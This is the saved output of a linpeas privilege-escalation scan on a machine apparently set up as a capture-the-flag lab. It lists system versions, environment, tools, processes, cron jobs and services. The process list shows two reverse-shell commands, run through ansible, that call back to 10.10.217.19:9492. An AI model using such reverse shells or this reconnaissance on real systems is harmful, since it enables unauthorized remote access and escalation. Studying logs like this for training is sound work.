```
bismuth@catpictures-ii:~$ cat lin.out 


                     \u2584\u2584\u2584\u2584\u2584\u2584\u2584\u2584\u2584\u2584\u2584\u2584\u2584\u2584
             \u2584\u2584\u2584\u2584\u2584\u2584\u2584             \u2584\u2584\u2584\u2584\u2584\u2584\u2584\u2584\u2584
      \u2584\u2584\u2584\u2584\u2584\u2584\u2584      \u2584\u2584\u2584\u2584\u2584\u2584\u2584\u2584\u2584\u2584\u2584\u2584\u2584\u2584\u2584\u2584\u2584\u2584\u2584\u2584  \u2584\u2584\u2584\u2584\u2584
  \u2584\u2584\u2584\u2584     \u2584 \u2584\u2584\u2584\u2584\u2584\u2584\u2584\u2584\u2584\u2584\u2584\u2584\u2584\u2584\u2584\u2584\u2584\u2584\u2584\u2584\u2584\u2584\u2584\u2584\u2584\u2584\u2584\u2584\u2584\u2584 \u2584\u2584\u2584\u2584\u2584\u2584\u2584
  \u2584    \u2584\u2584\u2584\u2584\u2584\u2584\u2584\u2584\u2584\u2584\u2584\u2584\u2584\u2584\u2584\u2584\u2584\u2584\u2584\u2584\u2584\u2584\u2584\u2584\u2584\u2584\u2584\u2584\u2584\u2584\u2584\u2584\u2584\u2584\u2584\u2584\u2584\u2584\u2584\u2584\u2584\u2584\u2584\u2584\u2584
  \u2584\u2584\u2584\u2584\u2584\u2584\u2584\u2584\u2584\u2584\u2584\u2584\u2584\u2584\u2584\u2584\u2584\u2584\u2584\u2584 \u2584\u2584\u2584\u2584\u2584       \u2584\u2584\u2584\u2584\u2584\u2584\u2584\u2584\u2584\u2584\u2584\u2584\u2584\u2584\u2584\u2584\u2584
  \u2584\u2584\u2584\u2584\u2584\u2584\u2584\u2584\u2584\u2584\u2584          \u2584\u2584\u2584\u2584\u2584\u2584               \u2584\u2584\u2584\u2584\u2584\u2584 \u2584
  \u2584\u2584\u2584\u2584\u2584\u2584              \u2584\u2584\u2584\u2584\u2584\u2584\u2584\u2584                 \u2584\u2584\u2584\u2584 
  \u2584\u2584                  \u2584\u2584\u2584 \u2584\u2584\u2584\u2584\u2584                  \u2584\u2584\u2584
  \u2584\u2584                \u2584\u2584\u2584\u2584\u2584\u2584\u2584\u2584\u2584\u2584\u2584\u2584                  \u2584\u2584
  \u2584            \u2584\u2584 \u2584\u2584\u2584\u2584\u2584\u2584\u2584\u2584\u2584\u2584\u2584\u2584\u2584\u2584\u2584\u2584\u2584\u2584\u2584\u2584\u2584\u2584\u2584\u2584\u2584\u2584\u2584\u2584\u2584   \u2584\u2584
  \u2584      \u2584\u2584\u2584\u2584\u2584\u2584\u2584\u2584\u2584\u2584\u2584\u2584\u2584\u2584\u2584\u2584\u2584\u2584\u2584\u2584\u2584\u2584\u2584\u2584\u2584\u2584\u2584\u2584\u2584\u2584\u2584\u2584\u2584\u2584\u2584\u2584\u2584\u2584\u2584\u2584\u2584\u2584\u2584
  \u2584\u2584\u2584\u2584\u2584\u2584\u2584\u2584\u2584\u2584\u2584\u2584\u2584\u2584                                \u2584\u2584\u2584\u2584
  \u2584\u2584\u2584\u2584\u2584  \u2584\u2584\u2584\u2584\u2584                       \u2584\u2584\u2584\u2584\u2584\u2584     \u2584\u2584\u2584\u2584
  \u2584\u2584\u2584\u2584   \u2584\u2584\u2584\u2584\u2584                       \u2584\u2584\u2584\u2584\u2584      \u2584 \u2584\u2584
  \u2584\u2584\u2584\u2584\u2584  \u2584\u2584\u2584\u2584\u2584        \u2584\u2584\u2584\u2584\u2584\u2584\u2584        \u2584\u2584\u2584\u2584\u2584     \u2584\u2584\u2584\u2584\u2584
  \u2584\u2584\u2584\u2584\u2584\u2584  \u2584\u2584\u2584\u2584\u2584\u2584\u2584      \u2584\u2584\u2584\u2584\u2584\u2584\u2584      \u2584\u2584\u2584\u2584\u2584\u2584\u2584   \u2584\u2584\u2584\u2584\u2584 
   \u2584\u2584\u2584\u2584\u2584\u2584\u2584\u2584\u2584\u2584\u2584\u2584\u2584\u2584        \u2584          \u2584\u2584\u2584\u2584\u2584\u2584\u2584\u2584\u2584\u2584\u2584\u2584\u2584\u2584\u2584 
  \u2584\u2584\u2584\u2584\u2584\u2584\u2584\u2584\u2584\u2584\u2584\u2584\u2584                       \u2584\u2584\u2584\u2584\u2584\u2584\u2584\u2584\u2584\u2584\u2584\u2584\u2584\u2584
  \u2584\u2584\u2584\u2584\u2584\u2584\u2584\u2584\u2584\u2584\u2584                         \u2584\u2584\u2584\u2584\u2584\u2584\u2584\u2584\u2584\u2584\u2584\u2584\u2584\u2584
  \u2584\u2584\u2584\u2584\u2584\u2584\u2584\u2584\u2584\u2584\u2584\u2584\u2584\u2584\u2584\u2584\u2584\u2584            \u2584\u2584\u2584\u2584\u2584\u2584\u2584\u2584\u2584\u2584\u2584\u2584\u2584\u2584\u2584\u2584\u2584\u2584\u2584\u2584
   \u2584\u2584\u2584\u2584\u2584\u2584   \u2584\u2584\u2584\u2584\u2584\u2584\u2584\u2584\u2584\u2584\u2584\u2584\u2584\u2584\u2584\u2584\u2584\u2584\u2584\u2584\u2584\u2584\u2584\u2584\u2584\u2584 \u2584\u2584\u2584\u2584\u2584\u2584\u2584\u2584\u2584\u2584\u2584\u2584\u2584
        \u2584\u2584\u2584\u2584\u2584\u2584\u2584\u2584      \u2584\u2584\u2584\u2584\u2584\u2584\u2584\u2584\u2584\u2584  \u2584\u2584\u2584\u2584\u2584\u2584\u2584\u2584\u2584\u2584 
             \u2584\u2584\u2584\u2584\u2584\u2584\u2584\u2584\u2584\u2584\u2584\u2584\u2584\u2584\u2584\u2584\u2584\u2584\u2584\u2584\u2584\u2584\u2584\u2584\u2584
    linpeas v2.6.8 by carlospolop

ADVISORY: linpeas should be used for authorized penetration testing and/or educational purposes only. Any misuse of this software will not be the responsibility of the author or of any other collaborator. Use it at your own networks and/or with the network owner's permission.

Linux Privesc Checklist: https://book.hacktricks.xyz/linux-unix/linux-privilege-escalation-checklist
 LEGEND:
  RED/YELLOW: 99% a PE vector
  RED: You must take a look at it
  LightCyan: Users with console
  Blue: Users without console & mounted devs
  Green: Common things (users, groups, SUID/SGID, mounts, .sh scripts, cronjobs) 
  LightMangeta: Your username


====================================( Basic information )=====================================
OS: Linux version 4.15.0-206-generic (buildd@lcy02-amd64-070) (gcc version 7.5.0 (Ubuntu 7.5.0-3ubuntu1~18.04)) #217-Ubuntu SMP Fri Feb 3 19:10:13 UTC 2023
User & Groups: uid=1000(bismuth) gid=1000(bismuth) groups=1000(bismuth),4(adm),24(cdrom),30(dip),46(plugdev),115(lpadmin),116(sambashare)
Hostname: catpictures-ii
Writable folder: /dev/shm
[+] /bin/ping is available for network discovery (linpeas can discover hosts, learn more with -h)
[+] /bin/nc is available for network discover & port scanning (linpeas can discover hosts and scan ports, learn more with -h)


Caching directories . . . . . . . . . . . . . . . . . . . . DONE
====================================( System Information )====================================
[+] Operative system
[i] https://book.hacktricks.xyz/linux-unix/privilege-escalation#kernel-exploits
Linux version 4.15.0-206-generic (buildd@lcy02-amd64-070) (gcc version 7.5.0 (Ubuntu 7.5.0-3ubuntu1~18.04)) #217-Ubuntu SMP Fri Feb 3 19:10:13 UTC 2023
Distributor ID:	Ubuntu
Description:	Ubuntu 18.04.6 LTS
Release:	18.04
Codename:	bionic

[+] Sudo version
[i] https://book.hacktricks.xyz/linux-unix/privilege-escalation#sudo-version
Sudo version 1.8.21p2

[+] PATH
[i] https://book.hacktricks.xyz/linux-unix/privilege-escalation#usdpath
/home/bismuth/bin:/home/bismuth/.local/bin:/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:/usr/games:/usr/local/games:/snap/bin
New path exported: /home/bismuth/bin:/home/bismuth/.local/bin:/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:/usr/games:/usr/local/games:/snap/bin

[+] Date
Wed Aug 14 04:38:29 PDT 2024

[+] System stats
Filesystem      Size  Used Avail Use% Mounted on
udev            459M     0  459M   0% /dev
tmpfs            99M  800K   98M   1% /run
/dev/xvda1       31G  4.8G   25G  17% /
tmpfs           492M  264K  492M   1% /dev/shm
tmpfs           5.0M     0  5.0M   0% /run/lock
tmpfs           492M     0  492M   0% /sys/fs/cgroup
tmpfs            99M     0   99M   0% /run/user/1000
              total        used        free      shared  buff/cache   available
Mem:        1006456      478504       87048        2488      440904      341784
Swap:        998396      151296      847100

[+] Environment
[i] Any private information inside environment variables?
LESSOPEN=| /usr/bin/lesspipe %s
HISTFILESIZE=0
MAIL=/var/mail/bismuth
USER=bismuth
SSH_CLIENT=10.10.217.19 41086 22
SHLVL=1
HOME=/home/bismuth
SSH_TTY=/dev/pts/4
DBUS_SESSION_BUS_ADDRESS=unix:path=/run/user/1000/bus
LOGNAME=bismuth
_=./linpeas.sh
XDG_SESSION_ID=10
TERM=xterm
PATH=/home/bismuth/bin:/home/bismuth/.local/bin:/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:/usr/games:/usr/local/games:/snap/bin
XDG_RUNTIME_DIR=/run/user/1000
LANG=en_US.UTF-8
HISTSIZE=0
SHELL=/bin/bash
LESSCLOSE=/usr/bin/lesspipe %s %s
SSH_CONNECTION=10.10.217.19 41086 10.10.121.66 22
XDG_DATA_DIRS=/usr/local/share:/usr/share:/var/lib/snapd/desktop
HISTFILE=/dev/null

[+] Searching Signature verification failed in dmseg
 Not Found

[+] AppArmor enabled? .............. apparmor module is loaded.
[+] grsecurity present? ............ grsecurity Not Found
[+] PaX bins present? .............. PaX Not Found
[+] Execshield enabled? ............ Execshield Not Found
[+] SELinux enabled? ............... sestatus Not Found
[+] Is ASLR enabled? ............... Yes
[+] Printer? ....................... lpstat Not Found
[+] Is this a container? ........... No
[+] Any running containers? ........ No


=========================================( Devices )==========================================
[+] Any sd* disk in /dev? (limit 20)

[+] Unmounted file-system?
[i] Check if you can mount umounted devices
UUID=19c5a501-a6ad-4d0b-97e9-02cd47d0f63e	/	ext4	errors=remount-ro	0 1
UUID=7786247f-7668-49ef-aea1-1e500c1a9227	none	swap	sw,nofail	0 0


====================================( Available Software )====================================
[+] Useful software
/bin/nc
/bin/netcat
/usr/bin/wget
/usr/bin/curl
/bin/ping
/usr/bin/gcc
/usr/bin/g++
/usr/bin/make
/usr/bin/base64
/usr/bin/python
/usr/bin/python2
/usr/bin/python3
/usr/bin/python2.7
/usr/bin/python3.6
/usr/bin/perl
/usr/bin/sudo
/usr/bin/docker
/usr/bin/lxc

[+] Installed Compiler
ii  g++                                    4:7.4.0-1ubuntu2.3                              amd64        GNU C++ compiler
ii  g++-5                                  5.5.0-12ubuntu1                                 amd64        GNU C++ compiler
ii  g++-7                                  7.5.0-3ubuntu1~18.04                            amd64        GNU C++ compiler
ii  gcc                                    4:7.4.0-1ubuntu2.3                              amd64        GNU C compiler
ii  gcc-5                                  5.5.0-12ubuntu1                                 amd64        GNU C compiler
ii  gcc-7                                  7.5.0-3ubuntu1~18.04                            amd64        GNU C compiler
/usr/bin/gcc
/usr/bin/g++


================================( Processes, Cron, Services, Timers & Sockets )================================
[+] Cleaned processes
[i] Check weird & unexpected proceses run by root: https://book.hacktricks.xyz/linux-unix/privilege-escalation#processes
bismuth   1827  0.3 13.6 932688 137048 ?       Ssl  03:08   0:19 /usr/local/bin/gitea web
bismuth   3921  0.0  0.1  76652  1604 ?        Ss   04:22   0:00 /lib/systemd/systemd --user
bismuth   3922  0.0  0.1 191568  1348 ?        S    04:22   0:00 (sd-pam)
bismuth   3998  0.0  0.2 104332  2088 ?        S    04:22   0:00 sshd: bismuth@pts/1,pts/3
bismuth   4079  0.0  0.0   4636   272 pts/1    Ss   04:22   0:00 /bin/sh -c /usr/bin/python /home/bismuth/.ansible/tmp/ansible-tmp-1723634528.12-2067740908923/command.py && sleep 0
bismuth   4080  0.0  0.1  38064  1728 pts/1    S    04:22   0:00 /usr/bin/python /home/bismuth/.ansible/tmp/ansible-tmp-1723634528.12-2067740908923/command.py
bismuth   4081  0.0  0.2  49652  2240 pts/1    S    04:22   0:00 /usr/bin/python /tmp/ansible_w0mF8G/ansible_module_command.py
bismuth   4082  0.0  0.1  12892  1492 pts/1    S    04:22   0:00 bash -c bash -i >& /dev/tcp/10.10.217.19/9492 0>&1
bismuth   4083  0.0  0.1  22656  1512 pts/1    S    04:22   0:00 bash -i
bismuth   4117  0.0  1.0  56972 10336 pts/1    S+   04:28   0:00 python3 -m http.server
bismuth   4234  0.0  0.0   4636   268 pts/3    Ss   04:29   0:00 /bin/sh -c /usr/bin/python /home/bismuth/.ansible/tmp/ansible-tmp-1723634967.01-276180358719782/command.py && sleep 0
bismuth   4235  0.0  0.6  38064  6080 pts/3    S    04:29   0:00 /usr/bin/python /home/bismuth/.ansible/tmp/ansible-tmp-1723634967.01-276180358719782/command.py
bismuth   4236  0.0  0.8  49652  8800 pts/3    S    04:29   0:00 /usr/bin/python /tmp/ansible_eYYcer/ansible_module_command.py
bismuth   4237  0.0  0.1  12892  1700 pts/3    S    04:29   0:00 bash -c bash -i >& /dev/tcp/10.10.217.19/9492 0>&1
bismuth   4238  0.0  0.3  22656  3548 pts/3    S+   04:29   0:00 bash -i
bismuth   4342  0.0  0.1 103856  1268 ?        S    04:30   0:00 sshd: bismuth@pts/4
bismuth   4343  0.0  0.4  22812  4176 pts/4    Ss   04:30   0:00 -bash
bismuth   4466  0.0  0.2   4952  2068 pts/4    S+   04:38   0:00 /bin/sh ./linpeas.sh
bismuth   4974  0.0  0.3  37376  3136 pts/4    R+   04:38   0:00 ps aux
bismuth   4976  0.0  0.0  16012   988 pts/4    S+   04:38   0:00 sort
bismuth    880  0.0  0.6  56972  6344 ?        Ss   03:07   0:01 /usr/bin/python3 -m http.server 8080
daemon     860  0.0  0.1  28336  1136 ?        Ss   03:07   0:00 /usr/sbin/atd -f
message+   830  0.0  0.1  50164  1736 ?        Ss   03:07   0:00 /usr/bin/dbus-daemon --system --address=systemd: --nofork --nopidfile --systemd-activation --syslog-only
root      1024  0.0  0.4 187240  4672 ?        Ssl  03:07   0:00 /usr/bin/python3 /usr/share/unattended-upgrades/unattended-upgrade-shutdown --wait-for-signal
root         1  0.3  0.4 159648  4884 ?        Ss   03:06   0:16 /sbin/init
root      1036  0.0  0.5 1159416 5992 ?        Ssl  03:07   0:00 /usr/bin/amazon-ssm-agent
root      1037  0.0  1.4 1362652 14920 ?       Ssl  03:07   0:01 /usr/bin/containerd
root      1069  0.0  0.1  15964  1140 ttyS0    Ss+  03:07   0:00 /sbin/agetty -o -p -- \u --keep-baud 115200,38400,9600 ttyS0 vt220
root      1070  0.0  0.0  16188   864 tty1     Ss+  03:07   0:00 /sbin/agetty -o -p -- \u --noclear tty1 linux
root      1078  0.0  0.1  72304  1528 ?        Ss   03:07   0:00 /usr/sbin/sshd -D
root      1172  0.0  1.8 1453176 18440 ?       Ssl  03:07   0:02 /usr/bin/dockerd -H fd:// --containerd=/run/containerd/containerd.sock
root      1516  0.0  0.1 1086948 1672 ?        Sl   03:07   0:00 /usr/bin/docker-proxy -proto tcp -host-ip 0.0.0.0 -host-port 3000 -container-ip 172.18.0.2 -container-port 3000
root      1540  0.0  0.1 1013216 1536 ?        Sl   03:07   0:00 /usr/bin/docker-proxy -proto tcp -host-ip 0.0.0.0 -host-port 80 -container-ip 172.17.0.2 -container-port 80
root      1553  0.0  0.0 1013216  688 ?        Sl   03:07   0:00 /usr/bin/docker-proxy -proto tcp -host-ip :: -host-port 3000 -container-ip 172.18.0.2 -container-port 3000
root      1555  0.0  0.0 1013216  788 ?        Sl   03:07   0:00 /usr/bin/docker-proxy -proto tcp -host-ip :: -host-port 80 -container-ip 172.17.0.2 -container-port 80
root      1580  0.0  0.0 1013216  740 ?        Sl   03:07   0:00 /usr/bin/docker-proxy -proto tcp -host-ip 0.0.0.0 -host-port 222 -container-ip 172.18.0.2 -container-port 22
root      1584  0.0  0.0 1013216  748 ?        Sl   03:07   0:00 /usr/bin/docker-proxy -proto tcp -host-ip :: -host-port 222 -container-ip 172.18.0.2 -container-port 22
root      1635  0.0  0.4 720496  4156 ?        Sl   03:07   0:01 /usr/bin/containerd-shim-runc-v2 -namespace moby -id ee0338aadb08e00c1a8c3911b63df5bdaa119155a764624ad096dd3ac3dad3a1 -address /run/containerd/containerd.sock
root      1636  0.0  0.3 720496  3944 ?        Sl   03:07   0:00 /usr/bin/containerd-shim-runc-v2 -namespace moby -id 7f6cb379755d04a2501fb0bb54eb1b85d2444e7f0f79ab825e297cd1c5847c91 -address /run/containerd/containerd.sock
root      1681  0.0  0.0   1020    60 ?        Ss   03:07   0:00 /bin/s6-svscan /etc/s6
root      1690  0.0  0.1  52120  1764 ?        Ss   03:07   0:01 /usr/bin/python /usr/bin/supervisord -c /etc/supervisor/supervisord.conf
root      1817  0.0  0.0   1028    64 ?        S    03:08   0:00 s6-supervise openssh
root      1819  0.0  0.0   1028    64 ?        S    03:08   0:00 s6-supervise gitea
root      1935  0.0  0.0  85880   492 ?        S    03:08   0:00 nginx: master process /usr/sbin/nginx
root      1976  0.0  0.3 297824  3300 ?        Ss   03:08   0:00 php-fpm: master process (/etc/php5/fpm/php-fpm.conf)
root      3885  0.0  0.0   4636   200 ?        S    04:22   0:00 sh -c git -C /root/ansible pull && ansible-playbook /root/ansible/playbook.yaml
root      3907  3.1  0.2 235252  2928 ?        Sl   04:22   0:31 /usr/bin/python2 /usr/bin/ansible-playbook /root/ansible/playbook.yaml
root       405  0.0  0.5 127508  5048 ?        S<s  03:06   0:01 /lib/systemd/systemd-journald
root      4060  0.0  0.7 237556  7600 ?        S    04:22   0:00 /usr/bin/python2 /usr/bin/ansible-playbook /root/ansible/playbook.yaml
root      4078  0.0  0.1  48132  1888 ?        S    04:22   0:00 ssh -C -o ControlMaster=auto -o ControlPersist=60s -o KbdInteractiveAuthentication=no -o PreferredAuthentications=gssapi-with-mic,gssapi-keyex,hostbased,publickey -o PasswordAuthentication=no -o User=bismuth -o ConnectTimeout=10 -o ControlPath=/root/.ansible/cp/1b2066a54a -tt 127.0.0.1 /bin/sh -c '/usr/bin/python /home/bismuth/.ansible/tmp/ansible-tmp-1723634528.12-2067740908923/command.py && sleep 0'
root      4119  0.0  0.0   4636   156 ?        S    04:29   0:00 sh -c git -C /root/ansible pull && ansible-playbook /root/ansible/playbook.yaml
root      4137  3.0  6.3 235004 63956 ?        Sl   04:29   0:16 /usr/bin/python2 /usr/bin/ansible-playbook /root/ansible/playbook.yaml
root      4215  0.0  6.5 237564 66064 ?        S    04:29   0:00 /usr/bin/python2 /usr/bin/ansible-playbook /root/ansible/playbook.yaml
root      4233  0.0  0.1  48132  1744 ?        S    04:29   0:00 ssh -C -o ControlMaster=auto -o ControlPersist=60s -o KbdInteractiveAuthentication=no -o PreferredAuthentications=gssapi-with-mic,gssapi-keyex,hostbased,publickey -o PasswordAuthentication=no -o User=bismuth -o ConnectTimeout=10 -o ControlPath=/root/.ansible/cp/1b2066a54a -tt 127.0.0.1 /bin/sh -c '/usr/bin/python /home/bismuth/.ansible/tmp/ansible-tmp-1723634967.01-276180358719782/command.py && sleep 0'
root       440  0.0  0.0  97712   172 ?        Ss   03:06   0:00 /sbin/lvmetad -f
root       451  0.0  0.3  46308  3084 ?        Ss   03:06   0:03 /lib/systemd/systemd-udevd
root       817  0.0  0.9 723552 10016 ?        Ssl  03:07   0:01 /usr/local/bin/OliveTin
root       825  0.0  0.1  31324  1456 ?        Ss   03:07   0:00 /usr/sbin/cron -f
root       845  0.0  0.2 636792  2164 ?        Ssl  03:07   0:01 /usr/bin/lxcfs /var/lib/lxcfs/
root       863  0.0  0.6 170816  6808 ?        Ssl  03:07   0:00 /usr/bin/python3 /usr/bin/networkd-dispatcher --run-startup-triggers
root       867  0.0  0.2 287640  2192 ?        Ssl  03:07   0:00 /usr/lib/accountsservice/accounts-daemon
root       878  0.0  0.2  70520  2072 ?        Ss   03:07   0:00 /lib/systemd/systemd-logind
root       908  0.0  0.2 291460  2296 ?        Ssl  03:07   0:00 /usr/lib/policykit-1/polkitd --no-debug
root       949  0.0  0.1  26000  1824 ?        Ss   03:07   0:00 /sbin/dhclient -1 -4 -v -pf /run/dhclient.eth0.pid -lf /var/lib/dhcp/dhclient.eth0.leases -I -df /var/lib/dhcp/dhclient6.eth0.leases eth0
syslog     879  0.0  0.1 263048  1944 ?        Ssl  03:07   0:00 /usr/sbin/rsyslogd -n
systemd+  1942  0.0  3.3 509036 33904 ?        Sl   03:08   0:02 /usr/sbin/mysqld --basedir=/usr --datadir=/var/lib/mysql --plugin-dir=/usr/lib/mysql/plugin --user=mysql --log-error=/var/log/mysql/error.log --pid-file=/var/run/mysqld/mysqld.pid --socket=/var/run/mysqld/mysqld.sock --port=3306
systemd+   490  0.0  0.1  80052  1896 ?        Ss   03:06   0:00 /lib/systemd/systemd-networkd
systemd+   672  0.0  0.1 141788  1764 ?        Ssl  03:07   0:00 /lib/systemd/systemd-timesyncd
systemd+   941  0.0  0.1  70624  1536 ?        Ss   03:07   0:00 /lib/systemd/systemd-resolved
USER       PID %CPU %MEM    VSZ   RSS TTY      STAT START   TIME COMMAND
uuidd     2716  0.0  0.0  28148   180 ?        Ss   03:45   0:00 /usr/sbin/uuidd --socket-activation
www-data  1944  0.0  0.0  86536   604 ?        S    03:08   0:00 nginx: worker process
www-data  1945  0.0  0.0  86192   324 ?        S    03:08   0:00 nginx: worker process
www-data  1946  0.0  0.0  86536   568 ?        S    03:08   0:00 nginx: worker process
www-data  1947  0.0  0.0  86536   592 ?        S    03:08   0:00 nginx: worker process
www-data  1980  0.0  0.5 298396  5972 ?        S    03:08   0:00 php-fpm: pool www
www-data  1981  0.0  0.6 298376  6212 ?        S    03:08   0:00 php-fpm: pool www

[+] Binary processes permissions
[i] https://book.hacktricks.xyz/linux-unix/privilege-escalation#processes
   0 lrwxrwxrwx 1 root root    4 Mar 13  2023 /bin/sh -> dash
1.6M -rwxr-xr-x 1 root root 1.6M Mar  2  2023 /lib/systemd/systemd
128K -rwxr-xr-x 1 root root 127K Mar  2  2023 /lib/systemd/systemd-journald
216K -rwxr-xr-x 1 root root 215K Mar  2  2023 /lib/systemd/systemd-logind
1.6M -rwxr-xr-x 1 root root 1.6M Mar  2  2023 /lib/systemd/systemd-networkd
376K -rwxr-xr-x 1 root root 375K Mar  2  2023 /lib/systemd/systemd-resolved
 40K -rwxr-xr-x 1 root root  39K Mar  2  2023 /lib/systemd/systemd-timesyncd
576K -rwxr-xr-x 1 root root 575K Mar  2  2023 /lib/systemd/systemd-udevd
 56K -rwxr-xr-x 1 root root  56K Sep 16  2020 /sbin/agetty
492K -rwxr-xr-x 1 root root 489K Oct  4  2022 /sbin/dhclient
   0 lrwxrwxrwx 1 root root   20 Mar  2  2023 /sbin/init -> /lib/systemd/systemd
 84K -rwxr-xr-x 1 root root  83K Jan 23  2020 /sbin/lvmetad
 14M -rwxr-xr-x 1 root root  14M Feb  3  2023 /usr/bin/amazon-ssm-agent
 50M -rwxr-xr-x 1 root root  50M Feb 16  2023 /usr/bin/containerd
9.1M -rwxr-xr-x 1 root root 9.1M Feb 16  2023 /usr/bin/containerd-shim-runc-v2
232K -rwxr-xr-x 1 root root 232K Oct 25  2022 /usr/bin/dbus-daemon
 92M -rwxr-xr-x 1 root root  92M Feb  9  2023 /usr/bin/dockerd
2.1M -rwxr-xr-x 1 root root 2.1M Feb  9  2023 /usr/bin/docker-proxy
 20K -rwxr-xr-x 1 root root  19K Jun  7  2022 /usr/bin/lxcfs
   0 lrwxrwxrwx 1 root root    9 Apr 16  2018 /usr/bin/python -> python2.7
   0 lrwxrwxrwx 1 root root    9 Apr 16  2018 /usr/bin/python2 -> python2.7
   0 lrwxrwxrwx 1 root root    9 Oct 25  2018 /usr/bin/python3 -> python3.6
180K -rwxr-xr-x 1 root root 179K Nov  2  2020 /usr/lib/accountsservice/accounts-daemon
 16K -rwxr-xr-x 1 root root  15K Jan 12  2022 /usr/lib/policykit-1/polkitd
 12M -rwxr-xr-x 1 root root  12M Oct 19  2022 /usr/local/bin/OliveTin
 28K -rwxr-xr-x 1 root root  27K Feb 19  2018 /usr/sbin/atd
 48K -rwxr-xr-x 1 root root  47K May 10  2022 /usr/sbin/cron
672K -rwxr-xr-x 1 root root 669K May  3  2022 /usr/sbin/rsyslogd
776K -rwxr-xr-x 1 root root 773K Mar 30  2022 /usr/sbin/sshd
 36K -rwxr-xr-x 1 root root  35K Sep 16  2020 /usr/sbin/uuidd

[+] Cron jobs
[i] https://book.hacktricks.xyz/linux-unix/privilege-escalation#scheduled-jobs
-rw-r--r-- 1 root root  722 Apr  5  2016 /etc/crontab

/etc/cron.d:
total 28
drwxr-xr-x   2 root root  4096 Mar 13  2023 .
drwxr-xr-x 107 root root 12288 Mar 27  2023 ..
-rw-r--r--   1 root root   589 Jul 16  2014 mdadm
-rw-r--r--   1 root root   102 Apr  5  2016 .placeholder
-rw-r--r--   1 root root   191 Nov  7  2022 popularity-contest

/etc/cron.daily:
total 64
drwxr-xr-x   2 root root  4096 Mar 13  2023 .
drwxr-xr-x 107 root root 12288 Mar 27  2023 ..
-rwxr-xr-x   1 root root   376 Mar 31  2016 apport
-rwxr-xr-x   1 root root  1478 Jun 15  2021 apt-compat
-rwxr-xr-x   1 root root   355 May 22  2012 bsdmainutils
-rwxr-xr-x   1 root root  1176 Sep  5  2019 dpkg
-rwxr-xr-x   1 root root   372 May  5  2015 logrotate
-rwxr-xr-x   1 root root  1065 Apr  7  2018 man-db
-rwxr-xr-x   1 root root   539 Jul 16  2014 mdadm
-rwxr-xr-x   1 root root   538 Mar  1  2018 mlocate
-rwxr-xr-x   1 root root   249 Nov 12  2015 passwd
-rw-r--r--   1 root root   102 Apr  5  2016 .placeholder
-rwxr-xr-x   1 root root  3477 Feb 20  2018 popularity-contest
-rwxr-xr-x   1 root root   214 Dec  7  2018 update-notifier-common

/etc/cron.hourly:
total 20
drwxr-xr-x   2 root root  4096 Mar 13  2023 .
drwxr-xr-x 107 root root 12288 Mar 27  2023 ..
-rw-r--r--   1 root root   102 Apr  5  2016 .placeholder

/etc/cron.monthly:
total 20
drwxr-xr-x   2 root root  4096 Mar 13  2023 .
drwxr-xr-x 107 root root 12288 Mar 27  2023 ..
-rw-r--r--   1 root root   102 Apr  5  2016 .placeholder

/etc/cron.weekly:
total 28
drwxr-xr-x   2 root root  4096 Mar 13  2023 .
drwxr-xr-x 107 root root 12288 Mar 27  2023 ..
-rwxr-xr-x   1 root root   723 Apr  7  2018 man-db
-rw-r--r--   1 root root   102 Apr  5  2016 .placeholder
-rwxr-xr-x   1 root root   403 Jan 20  2023 update-notifier-common

SHELL=/bin/sh
PATH=/usr/local/sbin:/usr/local/bin:/sbin:/bin:/usr/sbin:/usr/bin


[+] Services
[i] Search for outdated versions
 [ - ]  acpid
 [ + ]  apparmor
 [ + ]  apport
 [ + ]  atd
 [ - ]  bootmisc.sh
 [ - ]  cgroupfs-mount
 [ - ]  checkfs.sh
 [ - ]  checkroot-bootclean.sh
 [ - ]  checkroot.sh
 [ - ]  console-setup.sh
 [ + ]  cron
 [ - ]  cryptdisks
 [ - ]  cryptdisks-early
 [ + ]  dbus
 [ + ]  docker
 [ + ]  grub-common
 [ - ]  hostname.sh
 [ - ]  hwclock.sh
 [ - ]  irqbalance
 [ + ]  iscsid
 [ - ]  keyboard-setup.sh
 [ - ]  killprocs
 [ + ]  kmod
 [ - ]  lvm2
 [ + ]  lvm2-lvmetad
 [ + ]  lvm2-lvmpolld
 [ + ]  lxcfs
 [ + ]  lxd
 [ - ]  mdadm
 [ - ]  mdadm-waitidle
 [ - ]  mountall-bootclean.sh
 [ - ]  mountall.sh
 [ - ]  mountdevsubfs.sh
 [ - ]  mountkernfs.sh
 [ - ]  mountnfs-bootclean.sh
 [ - ]  mountnfs.sh
 [ + ]  networking
 [ - ]  nginx
 [ - ]  ondemand
 [ - ]  open-iscsi
 [ - ]  open-vm-tools
 [ - ]  plymouth
 [ - ]  plymouth-log
 [ + ]  procps
 [ + ]  qemu-guest-agent
 [ + ]  rc.local
 [ + ]  resolvconf
 [ - ]  rsync
 [ + ]  rsyslog
 [ - ]  screen-cleanup
 [ - ]  sendsigs
 [ + ]  ssh
 [ + ]  udev
 [ + ]  ufw
 [ - ]  umountfs
 [ - ]  umountnfs.sh
 [ - ]  umountroot
 [ + ]  unattended-upgrades
 [ + ]  urandom
 [ + ]  uuidd

[+] Systemd PATH
[i] https://book.hacktricks.xyz/linux-unix/privilege-escalation#systemd-path
PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:/snap/bin

[+] Analyzing .service files
[i] https://book.hacktricks.xyz/linux-unix/privilege-escalation#services
You can't write on systemd PATH so I'm not going to list relative paths executed by services

[+] System timers
[i] https://book.hacktricks.xyz/linux-unix/privilege-escalation#timers
NEXT                         LEFT          LAST                         PASSED       UNIT                         ACTIVATES
Wed 2024-08-14 06:32:44 PDT  1h 53min left Wed 2024-08-14 03:07:07 PDT  1h 31min ago apt-daily-upgrade.timer      apt-daily-upgrade.service
Wed 2024-08-14 10:23:07 PDT  5h 44min left Wed 2024-08-14 04:02:49 PDT  36min ago    ua-timer.timer               ua-timer.service
Wed 2024-08-14 12:04:52 PDT  7h left       Wed 2024-08-14 03:07:07 PDT  1h 31min ago apt-daily.timer              apt-daily.service
Wed 2024-08-14 19:11:47 PDT  14h left      Wed 2024-08-14 03:07:07 PDT  1h 31min ago motd-news.timer              motd-news.service
Thu 2024-08-15 03:22:00 PDT  22h left      Wed 2024-08-14 03:22:00 PDT  1h 16min ago systemd-tmpfiles-clean.timer systemd-tmpfiles-clean.service
